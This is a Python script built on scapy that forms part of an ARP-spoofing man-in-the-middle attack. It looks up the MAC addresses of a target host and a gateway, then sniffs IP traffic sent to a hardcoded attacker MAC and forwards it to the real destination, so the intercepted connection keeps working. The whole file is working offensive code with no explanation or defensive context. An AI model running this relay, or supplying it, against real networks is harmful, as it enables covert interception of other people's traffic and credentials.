#!/usr/bin/env python
import scapy.all as scapy
import argparse
import sys
import socket

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Specify spoof ip")
    return parser.parse_args()

def get_mac(ip):
    arp_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_packet = broadcast_packet/arp_packet
    answered_list = scapy.srp(arp_broadcast_packet, timeout=5, verbose=False)
    if(len(answered_list[0]) != 0):
        return answered_list[0][0][1].hwsrc
    return get_mac(ip)

def get_system_ip():
    return socket.gethostbyname(socket.gethostname())

arguments = get_arguments()
filter = "ip"
My_ip = get_system_ip()
My_mac = "20:4E:F6:AD:6B:65"

try:
    gateway_mac = get_mac(arguments.gateway)
    target_mac = get_mac(arguments.target)

    def redirecting(packet):
        if ((packet[scapy.IP].dst == arguments.gateway) and (packet[scapy.Ether].dst == My_mac)):
            packet[scapy.Ether].dst = gateway_mac
        elif((packet[scapy.IP].dst == arguments.target) and (packet[scapy.Ether].dst == My_mac)):
            packet[scapy.Ether].dst = target_mac
        scapy.sendp(packet,verbose=False)

    scapy.sniff(prn = redirecting, filter = filter, store = 0)

except KeyboardInterrupt:
    print("\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!")
    sys.exit(0)